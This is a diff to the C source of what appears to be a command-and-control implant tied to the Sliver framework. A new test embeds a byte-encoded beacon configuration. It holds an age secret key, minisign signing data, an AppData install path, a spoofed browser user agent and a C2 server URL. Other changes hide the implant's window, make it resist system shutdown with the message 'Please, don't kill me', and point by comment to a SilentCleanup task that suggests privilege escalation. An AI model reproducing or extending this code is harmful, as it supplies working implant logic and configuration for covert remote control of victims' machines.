@@ -2273,6 +2273,26 @@ void test133(void) {
 	LoadTypeLib(L"C:\\Users\\Admin\\Desktop\\test2.tlb", &pTypeLib);
 }
 
+void test134(void) {
+	BYTE MarshaledData[] = { 10, 62, 97, 103, 101, 49, 53, 116, 109, 122, 97, 108, 110, 97, 116, 120, 120, 117, 117, 110, 51, 120, 54, 115, 54, 120, 48, 107, 108, 118, 121, 121, 113, 100, 53, 100, 122, 101, 110, 50, 53, 50, 101, 51, 52, 54, 54, 53, 53, 121, 102, 100, 113, 56, 106, 117, 113, 113, 97, 107, 116, 119, 120, 108, 18, 62, 97, 103, 101, 49, 116, 99, 121, 106, 102, 52, 56, 104, 53, 53, 121, 53, 56, 120, 99, 97, 109, 119, 115, 97, 99, 97, 122, 103, 48, 57, 112, 56, 104, 99, 115, 97, 118, 104, 115, 103, 102, 106, 97, 121, 97, 118, 99, 100, 55, 119, 121, 99, 54, 97, 103, 115, 108, 100, 118, 107, 101, 110, 26, 74, 65, 71, 69, 45, 83, 69, 67, 82, 69, 84, 45, 75, 69, 89, 45, 49, 65, 57, 81, 74, 76, 54, 65, 72, 86, 57, 80, 53, 88, 80, 75, 74, 78, 72, 70, 54, 75, 88, 78, 55, 74, 65, 72, 69, 88, 84, 68, 56, 55, 86, 75, 77, 67, 82, 51, 56, 84, 70, 80, 84, 81, 89, 88, 90, 67, 51, 84, 81, 75, 86, 77, 78, 90, 55, 34, 113, 117, 110, 116, 114, 117, 115, 116, 101, 100, 32, 99, 111, 109, 109, 101, 110, 116, 58, 32, 109, 105, 110, 105, 115, 105, 103, 110, 32, 112, 117, 98, 108, 105, 99, 32, 107, 101, 121, 58, 32, 70, 57, 65, 52, 51, 65, 70, 69, 66, 66, 55, 50, 56, 53, 67, 70, 10, 82, 87, 84, 80, 104, 88, 75, 55, 47, 106, 113, 107, 43, 102, 103, 118, 52, 80, 101, 83, 79, 78, 71, 117, 100, 114, 78, 77, 84, 56, 118, 122, 87, 81, 111, 119, 122, 84, 102, 71, 119, 88, 108, 69, 118, 98, 71, 103, 75, 87, 83, 89, 97, 109, 121, 50, 42, 14, 68, 69, 67, 73, 83, 73, 86, 69, 95, 70, 69, 82, 82, 89, 50, 36, 57, 101, 99, 100, 52, 55, 55, 50, 45, 50, 50, 101, 100, 45, 52, 50, 56, 100, 45, 98, 101, 48, 55, 45, 97, 50, 53, 55, 57, 48, 57, 50, 102, 55, 52, 48, 58, 163, 2, 117, 110, 116, 114, 117, 115, 116, 101, 100, 32, 99, 111, 109, 109, 101, 110, 116, 58, 32, 115, 105, 103, 110, 97, 116, 117, 114, 101, 32, 102, 114, 111, 109, 32, 112, 114, 105, 118, 97, 116, 101, 32, 107, 101, 121, 58, 32, 70, 57, 65, 52, 51, 65, 70, 69, 66, 66, 55, 50, 56, 53, 67, 70, 10, 82, 87, 84, 80, 104, 88, 75, 55, 47, 106, 113, 107, 43, 86, 97, 99, 70, 88, 52, 105, 66, 103, 111, 51, 90, 119, 119, 103, 53, 66, 90, 113, 83, 48, 118, 121, 70, 120, 114, 57, 48, 113, 43, 87, 43, 106, 111, 48, 77, 76, 99, 115, 97, 121, 86, 65, 51, 72, 106, 120, 115, 69, 112, 68, 68, 85, 107, 75, 69, 76, 110, 84, 50, 105, 51, 73, 118, 107, 43, 118, 66, 73, 78, 87, 89, 113, 112, 53, 82, 111, 72, 106, 97, 73, 70, 82, 105, 103, 103, 61, 10, 116, 114, 117, 115, 116, 101, 100, 32, 99, 111, 109, 109, 101, 110, 116, 58, 32, 116, 105, 109, 101, 115, 116, 97, 109, 112, 58, 49, 55, 51, 48, 51, 51, 54, 57, 49, 53, 10, 51, 56, 99, 70, 56, 83, 102, 55, 87, 75, 65, 117, 50, 67, 55, 51, 100, 47, 89, 65, 48, 110, 71, 67, 55, 116, 69, 111, 82, 122, 56, 113, 122, 102, 79, 49, 99, 83, 89, 97, 57, 54, 97, 80, 116, 65, 111, 120, 105, 56, 67, 117, 97, 56, 90, 50, 71, 85, 89, 49, 112, 55, 72, 55, 107, 111, 117, 79, 108, 68, 114, 72, 54, 121, 105, 105, 114, 50, 77, 47, 78, 112, 80, 82, 65, 81, 61, 61, 64, 13, 72, 5, 80, 216, 4, 90, 18, 37, 65, 80, 80, 68, 65, 84, 65, 37, 92, 76, 111, 103, 105, 116, 101, 99, 104, 122, 201, 2, 10, 6, 115, 99, 114, 105, 112, 116, 10, 11, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 115, 10, 10, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 10, 7, 106, 115, 99, 114, 105, 112, 116, 10, 2, 106, 115, 10, 3, 117, 109, 100, 18, 6, 106, 113, 117, 101, 114, 121, 18, 5, 114, 111, 117, 116, 101, 18, 3, 97, 112, 112, 26, 6, 117, 112, 108, 111, 97, 100, 26, 7, 97, 99, 116, 105, 111, 110, 115, 34, 7, 115, 97, 109, 112, 108, 101, 115, 34, 3, 97, 112, 105, 42, 6, 97, 115, 115, 101, 116, 115, 42, 6, 105, 109, 97, 103, 101, 115, 50, 7, 101, 120, 97, 109, 112, 108, 101, 50, 7, 102, 97, 118, 105, 99, 111, 110, 58, 116, 77, 111, 122, 105, 108, 108, 97, 47, 53, 46, 48, 32, 40, 87, 105, 110, 100, 111, 119, 115, 32, 78, 84, 32, 49, 48, 46, 48, 59, 32, 87, 105, 110, 54, 52, 59, 32, 120, 54, 52, 41, 32, 65, 112, 112, 108, 101, 87, 101, 98, 75, 105, 116, 47, 53, 51, 55, 46, 51, 54, 32, 40, 75, 72, 84, 77, 76, 44, 32, 108, 105, 107, 101, 32, 71, 101, 99, 107, 111, 41, 32, 67, 104, 114, 111, 109, 101, 47, 49, 48, 54, 46, 48, 46, 57, 50, 54, 53, 46, 57, 56, 50, 32, 83, 97, 102, 97, 114, 105, 47, 53, 51, 55, 46, 51, 54, 66, 32, 71, 81, 72, 52, 82, 66, 85, 66, 83, 79, 76, 88, 52, 52, 54, 78, 50, 67, 66, 67, 83, 55, 65, 89, 72, 89, 76, 66, 77, 65, 50, 65, 72, 30, 80, 2, 88, 4, 96, 3, 104, 1, 114, 29, 104, 116, 116, 112, 58, 47, 47, 117, 98, 117, 110, 116, 117, 45, 105, 99, 101, 102, 114, 111, 103, 50, 48, 48, 48, 46, 99, 111, 109 };
+	WCHAR wszPath[] = L"C:\\Users\\Admin\\AppData\\Local\\Temp\\file.tmp";
+	WriteToFile(wszPath, MarshaledData, sizeof(MarshaledData));
+	UnmarshalConfig(wszPath);
+	DeleteFileW(wszPath);
+}
+
+void test135(void) {
+	DWORD dwParentPid = 0;
+	dwParentPid = GetParentProcessId(GetCurrentProcessId());
+	CHAR szFormatedMessage[0x100];
+	if (!AttachConsole(dwParentPid)) {
+		wsprintfA(szFormatedMessage, "0x%08x", GetLastError());
+		MessageBoxA(NULL, szFormatedMessage, "Title", MB_OK);
+	}
+
+	PrintFormatA("%d\n", dwParentPid);
+}
+
 BOOL IsExist
 (
 	PGLOBAL_CONFIG pConfig
@@ -2433,7 +2453,7 @@ VOID Final(VOID)
 	pGlobalConfig->lpConfigID = DuplicateStrA(szConfigId, 0);
 	pGlobalConfig->lpServerMinisignPublicKey = DuplicateStrA(szServerMinisignPubkey, 0);
 	pGlobalConfig->lpPeerAgePublicKeySignature = DuplicateStrA(szPeerAgePublicKeySignature, 0);
-	lstrcpyA(pGlobalConfig->szSliverName, szSliverClientName);
+	pGlobalConfig->lpSliverName = DuplicateStrA(szSliverClientName, 0);
 	pGlobalConfig->uEncoderNonce = uEncoderNonce;
 	pGlobalConfig->dwMaxFailure = dwMaxFailure;
 	pGlobalConfig->dwReconnectInterval = dwReconnectInterval;
@@ -2500,69 +2520,85 @@ LRESULT WindowProc
 	_In_ LPARAM lParam
 )
 {
-	if (uMsg == WM_QUERYENDSESSION) {
-		WriteToFile(L"C:\\Users\\Admin\\Desktop\\Hello.txt", "1", 1);
+	/*CHAR Message[0x100];
+
+	wsprintfA(Message, "%d\n", uMsg);
+	AppendToFile(L"C:\\Users\\Admin\\Desktop\\Hello.txt", Message, lstrlenA(Message));*/
+	if (uMsg == WM_QUERYENDSESSION || uMsg == WM_ENDSESSION || uMsg == WM_DESTROY || uMsg == WM_CLOSE) {
+		ShutdownBlockReasonCreate(hWnd, L"Please, don't kill me");
 	}
+	else {
+		return DefWindowProcW(hWnd, uMsg, wParam, lParam);
+	}
+
+	return 0;
 }
 
-VOID GetMessageLoop
+DWORD MessageLoop
 (
 	_In_ HWND hInstance
 )
 {
-	WNDCLASSA WndClass;
+	WNDCLASSEX WndClass;
 	HWND hWndMain = NULL;
-	BOOL bRet;
 	MSG Msg;
+	DWORD dwRetcode = 0;
 
 	SecureZeroMemory(&WndClass, sizeof(WndClass));
+	WndClass.cbSize = sizeof(WNDCLASSEX);
 	WndClass.style = 0;
-	WndClass.lpfnWndProc = (WNDPROC)WindowProc;
+	WndClass.lpfnWndProc = WindowProc;
 	WndClass.cbClsExtra = 0;
 	WndClass.cbWndExtra = 0;
 	WndClass.hInstance = hInstance;
-	WndClass.hIcon = LoadIconW((HINSTANCE)NULL, IDI_APPLICATION);
-	WndClass.hCursor = LoadCursorW((HINSTANCE)NULL, IDC_ARROW);
-	WndClass.hbrBackground = GetStockObject(WHITE_BRUSH);
-	WndClass.lpszMenuName = "MainMenu";
-	WndClass.lpszClassName = "MainWndClass";
-
-	if (!RegisterClassA(&WndClass)) {
-		LOG_ERROR("RegisterClassA", GetLastError());
+	WndClass.hIcon = LoadIconW(NULL, IDI_APPLICATION);
+	WndClass.hCursor = LoadCursorW(NULL, IDC_ARROW);
+	WndClass.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
+	WndClass.lpszMenuName = NULL;
+	WndClass.lpszClassName = DuplicateStrW(L"ShutdownWin", 0);
+	WndClass.hIconSm = LoadIconW(NULL, IDI_APPLICATION);
+	if (!RegisterClassExW(&WndClass)) {
+		LOG_ERROR("RegisterClassExW", GetLastError());
 		goto CLEANUP;
 	}
 
-	hWndMain = CreateWindowExA(0, "MainWndClass", NULL, WS_MINIMIZE, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, (HWND)NULL, (HMENU)NULL, hInstance, NULL);
+	hWndMain = CreateWindowExW(WS_EX_CLIENTEDGE, L"ShutdownWin", NULL, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, hInstance, NULL);
 	if (hWndMain == NULL) {
-		LOG_ERROR("CreateWindowExA", GetLastError());
+		LOG_ERROR("CreateWindowExW", GetLastError());
 		goto CLEANUP;
 	}
 
-	while ((bRet = GetMessageA(&Msg, NULL, 0, 0)) != 0) {
-		if (bRet != -1) {
-			TranslateMessage(&Msg);
-			DispatchMessageA(&Msg);
-		}
+	ShowWindow(hWndMain, SW_HIDE);
+	UpdateWindow(hWndMain);
+	while (GetMessageW(&Msg, NULL, 0, 0) > 0) {
+		TranslateMessage(&Msg);
+		DispatchMessageW(&Msg);
 	}
+
+	dwRetcode = Msg.wParam;
 CLEANUP:
-	return;
+	FREE(WndClass.lpszClassName);
+
+	return dwRetcode;
 }
 
-//int WinMain
-//(
-//	_In_ HINSTANCE hInstance,
-//	_In_opt_ HINSTANCE hPrevInstance,
-//	_In_ LPSTR lpCmdLine,
-//	_In_ int nShowCmd
-//)
-int main(void)
+int WinMain
+(
+	_In_ HINSTANCE hInstance,
+	_In_opt_ HINSTANCE hPrevInstance,
+	_In_ LPSTR lpCmdLine,
+	_In_ int nShowCmd
+)
+//int main(void)
 {
 	DWORD dwLevel = 0;
 	DWORD dwFlags = 0;
 	HANDLE hThread = NULL;
 
-	//AllocConsole();
-	/*if (GetProcessShutdownParameters(&dwLevel, &dwFlags)) {
+#ifdef _DEBUG
+	AttachConsole(GetParentProcessId(GetCurrentProcessId()));
+#endif
+	if (GetProcessShutdownParameters(&dwLevel, &dwFlags)) {
 		if (!SetProcessShutdownParameters(dwLevel, SHUTDOWN_NORETRY)) {
 			LOG_ERROR("SetProcessShutdownParameters", GetLastError());
 			goto CLEANUP;
@@ -2571,7 +2607,7 @@ int main(void)
 	else {
 		LOG_ERROR("GetProcessShutdownParameters", GetLastError());
 		goto CLEANUP;
-	}*/
+	}
 
 	RtlAddVectoredExceptionHandler(1, VectoredExceptionHandler);
 	LoadLibraryW(L"advapi32.dll");
@@ -2593,10 +2629,13 @@ int main(void)
 	LoadLibraryW(L"wtsapi32.dll");
 	LoadLibraryW(L"RPCRT4.dll");
 
-	/*hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)GetMessageLoop, hInstance, 0, NULL);
+	return MessageLoop(hInstance);
+	/*hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageLoop, hInstance, 0, NULL);
 	if (hThread == NULL) {
 		goto CLEANUP;
 	}*/
+
+	Sleep(1000000);
 	//StartTask(L"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup");
 	//test1();
 	//test2(L"C:\\Users\\Admin\\Desktop\\LogProvider.dll");
@@ -2726,7 +2765,9 @@ int main(void)
 	//test130();
 	//test131();
 	//test132();
-	test133();
+	//test133();
+	//test134();
+	test135();
 	//Final();
 	//WaitForSingleObject(hThread, INFINITE);
 CLEANUP:
